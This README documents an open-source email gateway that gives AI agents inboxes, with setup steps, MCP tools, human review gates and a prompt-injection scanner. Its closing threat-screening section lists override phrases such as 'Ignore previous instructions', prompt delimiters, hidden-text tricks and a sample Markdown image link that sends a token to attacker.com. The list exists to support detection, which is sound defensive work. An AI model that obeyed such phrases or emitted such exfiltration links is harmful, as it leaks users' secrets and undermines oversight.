# Open Agent Email

<div align="center">

### The Open-Source Email Gateway & Authenticated Inboxes for AI Agents

Give autonomous AI agents real two-way email inboxes, incoming SMTP reception, upstream relay sending, cryptographic SPF/DKIM/DMARC evidence, prompt-injection screening, and human-in-the-loop review gates.

[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.110+-green.svg)](https://fastapi.tiangolo.com/)
[![Next.js](https://img.shields.io/badge/Next.js-16.4-black.svg)](https://nextjs.org/)
[![TailwindCSS](https://img.shields.io/badge/TailwindCSS-v4-38bdf8.svg)](https://tailwindcss.com/)
[![MCP](https://img.shields.io/badge/MCP-JSON--RPC-purple.svg)](https://modelcontextprotocol.io/)

</div>

---

## 🌟 Key Capabilities

- **📬 Real Inbound SMTP Daemon**: Binds TCP port `2525` (dev) or `25` (production) to accept incoming emails directly from standard Mail Transfer Agents (MTAs) and external servers.
- **⚡ Upstream Outbound SMTP Relay**: Agents send real emails over the internet through upstream providers (AWS SES, Resend, SendGrid, Postmark, or Gmail SMTP with App Passwords).
- **🌐 Domains & DNS Record Verification**: Configure custom domains (e.g. `agents.yourdomain.com`) with auto-generated **MX**, **SPF**, **DKIM** (RSA), and **DMARC** records and real-time DNS status checks.
- **🧵 Standards-Compliant RFC Threading**: Preserves inbound `Message-ID`, `In-Reply-To`, and `References` headers, matches human replies to existing conversations, and sends standards-based threaded replies.
- **🛡️ Inbound Threat & Prompt-Injection Screening**: Built-in heuristic detector intercepts indirect prompt injections, hidden CSS / zero-point font tricks, ChatML delimiters (`<|im_start|>`), and Markdown data exfiltration.
- **👤 Human-in-the-Loop (HITL) Approval Queue**: Configurable policy holds sensitive or suspicious inbound and outbound emails in `pending_review` until an operator approves or quarantines them.
- **🤖 Model Context Protocol (MCP) Gateway**: Out-of-the-box MCP endpoint (`http://localhost:8000/mcp/rpc`) enables coding agents in **Cursor**, **Claude Code**, **Claude Desktop**, and **Windsurf** to read inboxes, reply, and send emails autonomously.
- **🔑 Bearer API Keys**: Manage tokens (`oae_live_...`) with fine-grained permission scopes for Python / TypeScript agent frameworks (LangChain, CrewAI, PydanticAI, OpenAI Agents SDK).

---

## 🏗️ Architecture

```text
    Real External Inboxes (Gmail / Outlook)  ·  Another AI Agent
                     │                                ▲
      Inbound SMTP   │                                │  Outbound Upstream SMTP
       (Port 2525)   ▼                                │  (AWS SES / Resend / Gmail)
  ┌───────────────────────────────────────────────────┴───────────────────────┐
  │                   Open Agent Email Gateway (FastAPI)                      │
  │                                                                           │
  │  1. Inbound SMTP Receiver (RFC 5321 / 5322)                               │
  │  2. Threat Scanner (Prompt Injection / Hidden Text / Exfiltration)       │
  │  3. Human-in-the-Loop (HITL) Review Gate                                  │
  │  4. Local Loopback Relay (Agent-to-Agent) & Upstream SMTP Relay           │
  │  5. SQLite / PostgreSQL Store with RFC Header Thread Tracking            │
  └───────────────────────────────┬───────────────────────────────────────────┘
                                  │  WebSockets / MCP / REST
                                  ▼
  ┌───────────────────────────────────────────────────────────────────────────┐
  │     Next.js Dashboard (:3000)      ·     Coding Agents (Cursor / Claude)  │
  │     • Live Inboxes & Thread View         • list_messages, get_message     │
  │     • Domains & DNS Verification         • send_message, reply_to_message │
  │     • Upstream SMTP Configuration        • list_reviews, approve_review   │
  │     • HITL Review Queue & API Keys       • WebSocket stream listener      │
  └───────────────────────────────────────────────────────────────────────────┘
```

---

## 🚀 Quickstart

### Prerequisites
- Python 3.11+
- Node.js 18+ & npm

### 1. Start the Server (FastAPI + Inbound SMTP)

```bash
cd server

# Create and activate virtual environment
python -m venv .venv

# On Windows:
.\.venv\Scripts\activate
# On Linux/macOS:
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Configure the dashboard administrator credential (keep it secret)
export ADMIN_API_KEY="$(python -c 'import secrets; print(secrets.token_urlsafe(32))')"

# Start server
python run.py
```

The server initializes:
- **FastAPI HTTP API & MCP**: `http://127.0.0.1:8000`
- **Interactive OpenAPI Docs**: `http://127.0.0.1:8000/docs`
- **Inbound SMTP Listener**: `127.0.0.1:2525`

### 2. Start the Client (Next.js Dashboard)

```bash
cd client
npm install
npm run dev
```

Open `http://localhost:3000` in your browser.
Choose **Connect dashboard** and enter the same `ADMIN_API_KEY` value.

---

## 🐳 Docker Deployment

Run the complete gateway stack with Docker Compose:

```bash
export ADMIN_API_KEY="$(python -c 'import secrets; print(secrets.token_urlsafe(32))')"
docker compose up -d --build
```

- Web Dashboard: `http://localhost:3000`
- REST API & MCP: `http://localhost:8000`
- SMTP Listener: Port `2525` (or map to `25` for direct internet MX delivery)

---

## ⚙️ Configuration & Features

### 1. Upstream SMTP Relay (`/settings`)
To let your agents send real emails to external people over the internet:
1. Connect the dashboard with `ADMIN_API_KEY`.
2. Choose a provider preset in **Upstream SMTP**. It fills in the host, port, and TLS mode; enter your provider-issued SMTP username and password/API token. For Amazon SES, use the SMTP endpoint for your AWS region.
3. Save the relay, send a test email, and enable outbound delivery.

These are SMTP relay presets, not provider-specific API integrations. Gmail requires an App Password; use SMTP credentials generated by SES, Resend, SendGrid, or Postmark.

### 2. Custom Domains & DNS (`/domains`)
1. Add your agent domain (e.g., `agents.yourdomain.com`).
2. Add the generated DNS records to your DNS registrar (Cloudflare, Route53, Namecheap):
   - `MX`: `10 mx.yourdomain.com` pointing to your server IP.
   - `TXT (SPF)`: `v=spf1 include:_spf.openagent.dev ~all`
   - `TXT (DKIM)`: `default._domainkey` with RSA public key.
   - `TXT (DMARC)`: `_dmarc` with `p=quarantine` or `p=reject`.
3. DNS verification is not implemented yet, so the dashboard does not mark records verified automatically.

### 3. Human-in-the-Loop Review Gate (`/reviews`)
When an agent has `hitl_enabled: true` or when the Threat Scanner detects suspicious prompt injection payloads:
- Inbound mail is quarantined before reaching the agent.
- Outbound mail is held before dispatching to upstream SMTP.
- Operators review reason, threat score, and diffs in the review queue and click **Approve** or **Reject**.

### 4. Human Handoff (`/inbox`)
Open an inbound message to view the full conversation in chronological order, including attachments on each message. Use **Hand off to a person** to forward the original email and an optional note to a teammate. Replies from the teammate to the forwarded email return to the agent inbox and stay in the original thread. The agent's outbound approval policy applies. A send is shown as failed when no outbound SMTP relay is configured or the relay rejects it.

Inbound MIME attachments are stored with their message and appear in the inbox with authenticated download links. Human handoff forwards those files along with the original message. The SMTP receiver defaults to a 20 MiB raw-message limit, 10 MiB per attachment, and 10 attachments per message; set `SMTP_MAX_MESSAGE_BYTES`, `SMTP_MAX_ATTACHMENT_BYTES`, and `SMTP_MAX_ATTACHMENTS` to adjust these bounds.

---

## 🤖 Coding Agent Integration (MCP)

Connect any Model Context Protocol compatible client to control agent inboxes.

### Cursor Setup
Create an inbox and an API key for it in **API Keys**. Then add to `.cursor/mcp.json` (or `~/.cursor/mcp.json`), replacing the placeholder with the generated key:

```json
{
  "mcpServers": {
    "open-agent-email": {
                    "url": "http://127.0.0.1:8000/mcp/rpc",
                    "headers": {
                        "Authorization": "Bearer PASTE_AGENT_API_KEY"
                    }
    }
  }
}
```

### Claude Code Setup
```bash
claude mcp add --transport http open-agent-email http://127.0.0.1:8000/mcp/rpc --header "Authorization: Bearer PASTE_AGENT_API_KEY"
```

### Available MCP Tools
| Tool | Description |
| :--- | :--- |
| `list_agents` | Lists all configured agent inboxes and their operational status. |
| `list_messages` | Fetches inbound and outbound messages with status and threat scores. |
| `get_message` | Retrieves full RFC headers, body text, HTML, and security verification verdicts. |
| `send_message` | Dispatches outbound email from the agent address (relays via upstream SMTP). |
| `reply_to_message` | Replies in-thread preserving `In-Reply-To` and `References`. |
| `forward_to_human` | Forwards the original message and optional context to a human teammate. Outbound approval rules still apply. |
| `list_reviews` | Lists emails held in the Human-in-the-Loop approval queue. |
| `approve_review` | Approves a held email and triggers delivery. |
| `reject_review` | Rejects and quarantines an email. |

---

## 📡 Python SDK & WebSockets Example

Connect an autonomous agent to stream incoming emails over WebSockets without opening firewall ports or using ngrok:

```python
import asyncio
import websockets
import json

AGENT_EMAIL = "assistant@agents.local"
API_KEY = "paste_the_key_for_this_inbox"
WS_URL = f"ws://127.0.0.1:8000/v1/agents/{AGENT_EMAIL}/ws"

async def listen():
    async with websockets.connect(WS_URL, additional_headers={"Authorization": f"Bearer {API_KEY}"}) as ws:
        print(f"Connected to live stream for {AGENT_EMAIL}")
        while True:
            msg = await ws.recv()
            event = json.loads(msg)
            if event.get("event") == "email.received":
                data = event["data"]
                print(f"New email from: {data['sender']} - Subject: {data['subject']}")

asyncio.run(listen())
```

---

## 🔒 Threat Screening Engine

The built-in scanner guards agent inboxes against:
- **Direct Instruction Overrides**: `Ignore previous instructions`, `Disregard system prompts`, `System Override`.
- **CSS / Font Smuggling**: `display:none`, `font-size:0px`, `visibility:hidden`, zero-width Unicode tags.
- **ChatML & Prompt Delimiters**: `<|im_start|>`, `[INST]`, `### System:`, `<|endoftext|>`.
- **Exfiltration Attacks**: Markdown image credential leaks (`![img](https://attacker.com/log?token=...)`).
- **Base64 Payload Obfuscation**: Automatic decoding and heuristic recursion.

---

## 📄 License

Apache 2.0. Open-source for developers and autonomous AI agent systems.
